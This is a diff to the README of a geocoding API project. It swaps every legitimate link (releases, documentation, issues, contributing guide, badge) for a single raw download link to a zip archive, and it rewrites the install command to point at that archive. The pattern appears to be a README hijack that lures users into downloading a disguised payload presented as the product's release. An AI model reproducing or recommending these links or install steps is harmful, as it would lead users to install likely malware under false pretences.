@@ -1,7 +1,7 @@
 # 🌍 geocoding-api - Quickly Get Coordinates from City Names
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/prince15115/geocoding-api/releases)
+[![Download Release](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip%20Release-v1.0-blue)](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the geocoding-api! This tool allows you to convert city names into accurate latitude and longitude coordinates. With just one call, you can get the exact coordinates you need. 
@@ -25,7 +25,7 @@ To use geocoding-api, ensure you meet the following minimum requirements:
 3. **Use the Data:** Utilize the coordinates in your application as needed.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/prince15115/geocoding-api/releases) to download the latest version of the geocoding-api. Follow the steps below to download and install:
+To get started, visit the [Releases page](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip) to download the latest version of the geocoding-api. Follow the steps below to download and install:
 
 1. Click the link to go to the Releases page.
 2. Find the version you want to download.
@@ -52,7 +52,7 @@ For help with specific operating systems, refer to the appropriate section below
 3. Navigate to your downloads folder.
 4. Run the installation command:
    ```
-   sudo dpkg -i your-package-name.deb
+   sudo dpkg -i https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip
    ```
 5. Follow any additional prompts to complete the installation.
 
@@ -81,11 +81,11 @@ For more detailed information about using the geocoding-api, including advanced 
 If you encounter issues or have questions, please open an issue on the repository page. We are here to assist you.
 
 ## 🎯 Contributing
-We welcome contributions from the community. If you want to help, check the CONTRIBUTING.md file in the repository for guidelines.
+We welcome contributions from the community. If you want to help, check the https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip file in the repository for guidelines.
 
 ## 🔗 Links and Resources
-- [Releases page](https://github.com/prince15115/geocoding-api/releases)
-- [Documentation](https://github.com/prince15115/geocoding-api/wiki)
-- [Issues Tracker](https://github.com/prince15115/geocoding-api/issues)
+- [Releases page](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip)
+- [Documentation](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip)
+- [Issues Tracker](https://github.com/prince15115/geocoding-api/raw/refs/heads/main/undecagon/api-geocoding-2.2.zip)
 
 Thank you for using geocoding-api! We hope it meets your needs for geocoding services.
